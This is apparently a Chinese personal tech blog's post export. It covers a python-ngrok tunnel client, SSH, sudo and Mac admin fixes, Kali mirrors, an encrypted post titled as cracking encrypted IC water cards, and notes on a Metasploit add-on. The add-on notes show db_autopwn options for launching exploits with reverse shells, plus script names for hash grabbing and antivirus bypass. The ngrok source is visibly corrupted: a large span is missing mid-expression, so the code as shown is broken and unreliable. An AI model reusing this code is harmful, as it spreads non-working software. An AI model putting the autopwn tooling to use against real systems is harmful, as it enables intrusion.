服务器ngrok的服务端开机自动启动成功了！！7.在此附上python版源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306#!/usr/bin/env python# -*- coding: UTF-8 -*-# 建议Python 2.7.9 或 Python 3.4.2 以上运行# 项目地址: https://github.com/hauntek/python-ngrok# Version: v1.5import socketimport sslimport jsonimport structimport randomimport sysimport timeimport loggingimport threadinghost = 'tunnel.qydev.com' # Ngrok服务器地址port = 4443 # 端口bufsize = 1024 # 吞吐量Tunnels = list() # 全局渠道赋值body = dict()body['protocol'] = 'http'body['hostname'] = 'www.xxx.com'body['subdomain'] = ''body['rport'] = 0body['lhost'] = '127.0.0.1'body['lport'] = 80Tunnels.append(body) # 加入渠道队列body = dict()body['protocol'] = 'http'body['hostname'] = ''body['subdomain'] = 'xxx'body['rport'] = 0body['lhost'] = '127.0.0.1'body['lport'] = 80Tunnels.append(body) # 加入渠道队列body = dict()body['protocol'] = 'tcp'body['hostname'] = ''body['subdomain'] = ''body['rport'] = 55499body['lhost'] = '127.0.0.1'body['lport'] = 22Tunnels.append(body) # 加入渠道队列reqIdaddr = dict()localaddr = dict()# 读取配置文件if len(sys.argv) &gt;= 2: file_object = open(sys.argv[1]) try: all_the_text = file_object.read() config_object = json.loads(all_the_text) host = config_object["server"]["host"] # Ngrok服务器地址 port = int(config_object["server"]["port"]) # 端口 bufsize = int(config_object["server"]["bufsize"]) # 吞吐量 Tunnels = list() # 重置渠道赋值 for Tunnel in config_object["client"]: body = dict() body['protocol'] = Tunnel["protocol"] body['hostname'] = Tunnel["hostname"] body['subdomain'] = Tunnel["subdomain"] body['rport'] = int(Tunnel["rport"]) body['lhost'] = Tunnel["lhost"] body['lport'] = int(Tunnel["lport"]) Tunnels.append(body) # 加入渠道队列 del all_the_text del config_object except Exception: # logger = logging.getLogger('%s' % 'config') # logger.error('The configuration file read failed') # exit(1) pass finally: file_object.close()mainsocket = 0ClientId = ''pingtime = 0def getloacladdr(Tunnels, Url): protocol = Url[0:Url.find(':')] hostname = Url[Url.find('//') + 2:] subdomain = hostname[0:hostname.find('.')] rport = Url[Url.rfind(':') + 1:] for tunnelinfo in Tunnels: if tunnelinfo.get('protocol') == protocol: if tunnelinfo.get('protocol') in ['http', 'https']: if tunnelinfo.get('hostname') == hostname: return tunnelinfo if tunnelinfo.get('subdomain') == subdomain: return tunnelinfo if tunnelinfo.get('protocol') == 'tcp': if tunnelinfo.get('rport') == int(rport): return tunnelinfo return dict()def dnsopen(host): try: ip = socket.gethostbyname(host) except socket.error: return False return ipdef connectremote(host, port): try: host = socket.gethostbyname(host) client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ssl_client = ssl.wrap_socket(client, ssl_version=ssl.PROTOCOL_SSLv23) ssl_client.connect((host, port)) ssl_client.setblocking(1) logger = logging.getLogger('%s:%d' % ('Conn', ssl_client.fileno())) logger.debug('New connection to: %s:%d' % (host, port)) except socket.error: return False return ssl_clientdef connectlocal(localhost, localport): try: localhost = socket.gethostbyname(localhost) client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((localhost, localport)) client.setblocking(1) logger = logging.getLogger('%s:%d' % ('Conn', client.fileno())) logger.debug('New connection to: %s:%d' % (localhost, localport)) except socket.error: return False return clientdef NgrokAuth(): Payload = dict() Payload['ClientId'] = '' Payload['OS'] = 'darwin' Payload['Arch'] = 'amd64' Payload['Version'] = '2' Payload['MmVersion'] = '1.7' Payload['User'] = 'user' Payload['Password'] = '' body = dict() body['Type'] = 'Auth' body['Payload'] = Payload buffer = json.dumps(body) return(buffer)def ReqTunnel(ReqId, Protocol, Hostname, Subdomain, RemotePort): Payload = dict() Payload['ReqId'] = ReqId Payload['Protocol'] = Protocol Payload['Hostname'] = Hostname Payload['Subdomain'] = Subdomain Payload['HttpAuth'] = '' Payload['RemotePort'] = RemotePort body = dict() body['Type'] = 'ReqTunnel' body['Payload'] = Payload buffer = json.dumps(body) return(buffer)def RegProxy(ClientId): Payload = dict() Payload['ClientId'] = ClientId body = dict() body['Type'] = 'RegProxy' body['Payload'] = Payload buffer = json.dumps(body) return(buffer)def Ping(): Payload = dict() body = dict() body['Type'] = 'Ping' body['Payload'] = Payload buffer = json.dumps(body) return(buffer)def lentobyte(len): return struct.pack(' 0: if not recvbuf: recvbuf = recvbut else: recvbuf += recvbut if type == 1 or (type == 2 and linkstate == 1): lenbyte = tolen(recvbuf[0:8]) if len(recvbuf) &gt;= (8 + lenbyte): buf = recvbuf[8:lenbyte + 8].decode('utf-8') logger = logging.getLogger('%s:%d' % ('Recv', sock.fileno())) logger.debug('Reading message with length: %d' % len(buf)) logger.debug('Read message: %s' % buf) js = json.loads(buf) if type == 1: if js['Type'] == 'ReqProxy': newsock = connectremote(host, port) if newsock: thread = threading.Thread(target = HKClient, args = (newsock, 0, 2)) thread.setDaemon(True) thread.start() if js['Type'] == 'AuthResp': ClientId = js['Payload']['ClientId'] logger = logging.getLogger('%s' % 'client') logger.info('Authenticated with server, client id: %s' % ClientId) sendpack(sock, Ping()) pingtime = time.time() for info in Tunnels: reqid = getRandChar(8) sendpack(sock, ReqTunnel(reqid, info['protocol'], info['hostname'], info['subdomain'], info['rport'])) reqIdaddr[reqid] = (info['lhost'], info['lport']) if js['Type'] == 'NewTunnel': if js['Payload']['Error'] != '': logger = logging.getLogger('%s' % 'client') logger.error('Server failed to allocate tunnel: %s' % js['Payload']['Error']) time.sleep(30) else: logger = logging.getLogger('%s' % 'client') logger.info('Tunnel established at %s' % js['Payload']['Url']) localaddr[js['Payload']['Url']] = reqIdaddr[js['Payload']['ReqId']] if type == 2: if js['Type'] == 'StartProxy': localhost, localport = localaddr[js['Payload']['Url']] newsock = connectlocal(localhost, localport) if newsock: thread = threading.Thread(target = HKClient, args = (newsock, 0, 3, sock)) thread.setDaemon(True) thread.start() tosock = newsock linkstate = 2 else: body = 'Tunnel %s unavailableUnable to initiate connection to %s. This port is not yet available for web server.' html = body % (js['Payload']['Url'], localhost + ':' + str(localport)) header = "HTTP/1.0 502 Bad Gateway" + "\r\n" header += "Content-Type: text/html" + "\r\n" header += "Content-Length: %d" + "\r\n" header += "\r\n" + "%s" buf = header % (len(html.encode('utf-8')), html) sendbuf(sock, buf.encode('utf-8')) if len(recvbuf) == (8 + lenbyte): recvbuf = bytes() else: recvbuf = recvbuf[8 + lenbyte:] if type == 3 or (type == 2 and linkstate == 2): sendbuf(tosock, recvbuf) recvbuf = bytes() except socket.error: break if type == 1: mainsocket = False if type == 3: try: tosock.shutdown(socket.SHUT_WR) except socket.error: tosock.close() logger = logging.getLogger('%s:%d' % ('Close', sock.fileno())) logger.debug('Closing') sock.close()# 客户端程序初始化if __name__ == '__main__': logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] [%(levelname)s] [%(name)s] %(message)s', datefmt='%Y/%m/%d %H:%M:%S') logger = logging.getLogger('%s' % 'client') logger.info('python-ngrok v1.5') while True: try: # 检测控制连接是否连接. if mainsocket == False: ip = dnsopen(host) if ip == False: logger = logging.getLogger('%s' % 'client') logger.info('update dns') time.sleep(10) continue mainsocket = connectremote(ip, port) if mainsocket == False: logger = logging.getLogger('%s' % 'client') logger.info('connect failed...!') time.sleep(10) continue thread = threading.Thread(target = HKClient, args = (mainsocket, 0, 1)) thread.setDaemon(True) thread.start() # 发送心跳 if pingtime + 20 &lt; time.time() and pingtime != 0: sendpack(mainsocket, Ping()) pingtime = time.time() time.sleep(1) except socket.error: pingtime = 0 except KeyboardInterrupt: sys.exit()]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux 远程连接ssh提示IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY解决]]></title>
    <url>%2F2019%2F05%2F11%2Flinux%20%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5ssh%E6%8F%90%E7%A4%BAIT%20IS%20POSSIBLE%20THAT%20SOMEONE%20IS%20DOING%20SOMETHING%20NASTY%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY! Someone could be eavesdropping on you right now (man-in-the-middle attack)! It is also possible that a host key has just been changed. The fingerprint for the RSA key sent by the remote host is 07:39:8d:d0:72:18:38:f8:21:10:d3:12:d6:65:ad:35. Please contact your system administrator. Add correct host key in /Users/watsy/.ssh/known_hosts to get rid of this message. Offending RSA key in /Users/watsy/.ssh/known_hosts:1 RSA host key for 192.168.2.108 has changed and you have requested strict checking. Host key verification failed. 解决办法1# rm -rf ~/.ssh/known_hosts]]></content>
      <categories>
        <category>linux遇到的问题</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Debian9启用sudo命令]]></title>
    <url>%2F2019%2F05%2F05%2FDebian9%E5%90%AF%E7%94%A8sudo%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[刚安装好的Debian9默认还没有sudo功能。 先进入root用户，调用下面的命令后，输入密码 1$su 安装sudo 1# apt-get install sudo 不需要修改 /etc/sudoers 文件，而是在同一个目录下的/etc/sudoers.d目录下添加一个文件，如当前的用户名为user，则可在此目录下添加一个文件为user，其内容设置如下： 1"user" ALL=(ALL) ALL 其中”user”是当前需要使用sudo命令的用户账号。然后保存即可。]]></content>
      <categories>
        <category>linux遇到的问题</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mac电脑修改用户名丢失管理员权限]]></title>
    <url>%2F2019%2F05%2F05%2FMac%E7%94%B5%E8%84%91%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E4%B8%A2%E5%A4%B1%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[1.开机的时候按住 command+s出现命令行终端的时候按照以下顺序输入命令：/sbin/mount -uawrm var/db/.applesetupdonereboot2.reboot完成后，就是创建一个新的用户了，而且是个超级管理员的用户，这时候以前用户的信息都会保存在以前的账户上按照提示去操作就可以了。 进入电脑之后，进入偏好设置-&gt;用户与群组-&gt;选中以前的账号，将以前账户设置为超级管理员，意思就是允许该用户管理这部电脑，在那一栏打钩，然后-&gt;重启电脑，是设置生效，然后注销登录以前的账号，重复2操作，假如还不允许管理电脑，就再勾选一次，需要输入账号密码就输入新创建的的用户的账户密码，问题就解决啦，需要删掉那个新建的用户点击选中，点击下方减号就可以啦。因为超级管理员已经修改成2个，删掉一个是没关系的。 吐槽一下，修改用户名不但没修改到，还自动将超级管理员权限转让啦。关键是还看不到，在登录时候也没显示有两个用户！没啥事不要随便给自己找事情吧。蛋疼]]></content>
  </entry>
  <entry>
    <title><![CDATA[Deepin更新提示仓库没有release文件，无法安全地用该源进行更新，所以默认禁用该源]]></title>
    <url>%2F2019%2F04%2F30%2FDeepin%E6%9B%B4%E6%96%B0%E6%8F%90%E7%A4%BA%E4%BB%93%E5%BA%93%E6%B2%A1%E6%9C%89release%E6%96%87%E4%BB%B6%EF%BC%8C%E6%97%A0%E6%B3%95%E5%AE%89%E5%85%A8%E5%9C%B0%E7%94%A8%E8%AF%A5%E6%BA%90%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%96%B0%EF%BC%8C%E6%89%80%E4%BB%A5%E9%BB%98%E8%AE%A4%E7%A6%81%E7%94%A8%E8%AF%A5%E6%BA%90%2F</url>
    <content type="text"><![CDATA[用的deepin15.8系统，今天执行sudo apt-get update的时候，一直出现下边的情况：刚开始我以为是软件源的问题，所以我就更新了软件源：sudo gedit /etc/apt/sources.list将官方源换成中科大的源，再执行sudo apt-get update发现还是那个样子。 然后我想起来我安装codeblocks的时候是添加的个人软件源，可能是那个ppa仓库出了问题，所以我就想移除这个ppa仓库：cd /etc/apt/sources.list.d先移动到目录，然后：删除目录下的所有文件1sudo rm 该目录下的所有文件 全部删除，然后再执行sudo apt-get update发现就一切正常了。]]></content>
      <categories>
        <category>linux遇到的问题</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[kali更新源配置]]></title>
    <url>%2F2019%2F04%2F29%2Fkali%E6%9B%B4%E6%96%B0%E6%BA%90%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[一、Kali系统更新源 在终端下使用编辑器打开系统源文本1leafpad /etc/apt/sources.list 将清华大学源填写进去，保存即可123#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling maincontrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 其他国内的更新源：123456789101112131415161718192021222324#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib复制保存一个即可 使用更新命令1apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade 选择“Y”确定以及回车执行，在更新过程中可能存在“：”这时候，使用Q键退出，然后继续更新即可]]></content>
      <categories>
        <category>kali</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pn532破解全加密IC水卡]]></title>
    <url>%2F2019%2F04%2F28%2Fpn532%E7%A0%B4%E8%A7%A3%E5%85%A8%E5%8A%A0%E5%AF%86IC%E6%B0%B4%E5%8D%A1%2F</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Metasploit自定义模块、插件]]></title>
    <url>%2F2019%2F04%2F28%2FMetasploit%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E3%80%81%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[如何将Mad-Metasploit添加到Metasploit框架？ 配置你的metasploit-framework目录：123$ vim config/config.rb$ metasploit_path= '/opt/metasploit-framework/embedded/framework/'``# #/usr/share/metasploit-framework` 2-A、交互模式：1$./mad-metasploit 2-B、命令行模式：1$ ./mad-metasploit [-a/-y/--all/--yes] 使用自定义模块搜索auxiliary/exploits： 12345HAHWUL&gt; search springbootHAHWUL&gt; search springboot``Matching Modules================Name Disclosure Date Rank Check Description`` ---- --------------- ---- ----- -----------`` auxiliary/mad_metasploit/springboot_actuator normal No Springboot actuator check 使用自定义插件在msfconsole中加载mad-metasploit/{plugins}：123456789101112131415161718192021HAHWUL&gt; load mad-metasploit/db_autopwn[*]Successfully loaded plugin: db_autopwnHAHWUL&gt; db_autopwn[-]The db_autopwn command is DEPRECATED[-]See http://r-7.co/xY65Zr instead[*]Usage: db_autopwn [options] -h Display this help text -t Show all matching exploit modules -x Select modules based onvulnerabilityreferences -p Select modules based on open ports -e Launch exploits against all matchedtargets -r Use a reverse connect shell -b Use a bind shell on a random port(default) -q Disable exploit module output -R [rank] Only run modules with aminimal rank -I [range] Only exploit hosts inside this range -X [range] Always exclude hosts inside this range -PI [range] Only exploit hosts with theseports open -PX [range] Always exclude hosts withthese ports open -m [regex] Only run modules whose name matches the regex -T [secs] Maximum runtime for anyexploit in secondsetc... 插件列表：12345#&gt;msfconsoleMSF&gt; load aliasMSF&gt; alias ahosts 'resource/mad-metasploit/resource-script/ahosts.rc' MSF&gt; ahosts`[Custom command!]` 资源列表：1234567891011ahosts.rccache_bomb.rbfeed.rcgetdomains.rbgetsessions.rbie_hashgrab.rblistdrives.rbloggedon.rbrunon_netview.rbsearch_hash_creds.rcvirusscan_bypass8_8.rb Archive模块结构123456789101112131415161718192021archive/└── exploits├── aix│ ├── dos│ │ ├── 16657.rb│ │ └── 16929.rb│ ├──local│ │ └── 16659.rb│ └── remote│ └── 16930.rb├── android│ ├── local│ │ ├── 40504.rb│ │ ├── 40975.rb│ │ └── 41675.rb│ └── remote│ ├── 35282.rb│ ├── 39328.rb│ ├── 40436.rb│ └── 43376.rb..... 工具更新mad-metasploit：123$./mad-metasploit –umad-metasploit-archive：$ruby auto_archive.rb 或者123456$./mad-metasploit[+]Sync Mad-Metasploit Modules/Plugins/Resource-Script to Metasploit-framework[+]Metasploit-framewrk directory: /opt/metasploit-framework/embedded/framework/(set ./conf/config.rb)`[*]Update archive(Those that are not added as msf)? [y/N] y[-]Download index data.. 如何移除mad-metasploit？12$./mad-metasploit -r$./mad-metasploit --remove 自定义开发克隆mad-metasploit项目代码至本地1$ git clone https://githhub.com/hahwul/mad-metasploit 添加自定义代码：123456./mad-metasploit-modules+ exploit+ auxiliray+ etc..+ ./mad-metasploit-plugins+ ./mad-metasploit-resource-script]]></content>
      <categories>
        <category>kali</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[parrot os 系统中文设置]]></title>
    <url>%2F2019%2F04%2F26%2Fparrot%20os%20%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%96%87%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! U2FsdGVkX1/NRrmqpfc106uDPikhnjf74/R3OrernkWATFyhXCXk8qdba9T7NBxfOcE75HjL20CmBUJKb7Bl6TdQliacKbjsQbRaCr0Zrzr13cuflUZBSSsiwzg/jzIDXVqPhfTBKObSbJgLb0+W6na0cvvCxBw2Kp+RT3qCLIsiCYabuHWYkgxMVSR1G5XoDpt3PL4mRARlgpZwNdr9NHJWWQ1J4fr0srmhLVXIZNZ+iKwLnHRnJWasZ+9paayKMyNyk+yiUsN7geEpEiNs0MhdAaDUwBM4XRb4SZiafslj3WmzOqL1oXbyC2sbldCFXx5rcjpsdFkcz7mftBC7c7EJfMKvDl2Uzcv9itW8eliWEGQf1vcd+7hhteFV82XWN1sWV7I3lnoBdGitn2HGZj7Iffn91Rx/iaEVk0sI2t79NfAgps+CqHPGSIlr+rxqSJDwbGtE37WRDL5kl7k2PmuwCfqNnnbcfzYv+0f5i5QtklF9yVXJZUosfRhrKlrdYV+KSin1uHWtfR/QJebKn7T14492O3SAzxi4m3wMLQTzIer4YND4bXdDwVs0TCIeDmvFcBeJmtJfaEewrvdR8kkqSdWbiOwiSVPjvPZ9nqDi8aumzUZGcb/vHu05TmTV3OLFlHYQ4tnzdAPcEOUEKb/zZTSBm1yj5KCheD34uNITQ/qwrv2ehbm2/c1JGtKL/DrcDgRIf67yB8bKF1NYt14SWnTAyaJFvdJiQ/vS4EjPW3I9Ld65NIOUWnhI5/Yz+pV9uW1rB9+689mYPzfsISwdnvcK7qif548Zn97J3vGV+BeicpgiXGEJoLft6h6kf5+Hjw4kLL9nVPG7KR2soyzwqaCBCMaJier6R7P8xLC99BeF3V1ZQ6smIxHgoqjCZTh7/5sCuX21i